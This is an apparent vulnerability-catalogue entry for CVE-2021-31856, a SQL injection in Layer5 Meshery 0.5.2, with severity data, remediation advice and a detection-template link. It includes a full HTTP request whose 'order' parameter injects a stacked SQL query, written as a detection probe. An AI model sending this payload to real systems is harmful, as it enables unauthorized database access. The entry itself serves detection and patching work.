---
layout: post
cve_id: CVE-2021-31856
title: Layer5 Meshery 0.5.2 - SQL Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-31856.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-31856.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized access, data
  leakage, or data manipulation.

  '
remediation: 'Upgrade to a patched version of Layer5 Meshery or apply the necessary
  security patches to mitigate the SQL Injection vulnerability (CVE-2021-31856).

  '
reference:
- https://github.com/ssst0n3/CVE-2021-31856
- https://nvd.nist.gov/vuln/detail/CVE-2021-31856
- https://meshery.io
- https://github.com/layer5io/meshery/pull/2745
- https://github.com/ssst0n3/my_vulnerabilities
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-31856
  cwe-id: CWE-89
  epss-score: 0.79924
  epss-percentile: 0.99063
  cpe: cpe:2.3:a:layer5:meshery:0.5.2:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: layer5
  product: meshery
tags:
- cve2021
- cve
- sqli
- layer5
- vuln
---

## üîç Vulnerability Description
Layer5 Meshery 0.5.2 contains a SQL injection vulnerability in the REST API that allows an attacker to execute arbitrary SQL commands via the /experimental/patternfiles endpoint (order parameter in GetMesheryPatterns in models/meshery_pattern_persister.go).

## üåê HTTP Request
```nohighlight
GET /api/experimental/patternfile?order=id%3Bselect(md5(1130))&page=0&page_size=0 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; ja-jp) AppleWebKit/523.12.2 (KHTML, like Gecko) Version/3.0.4 Safari/523.12.2
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

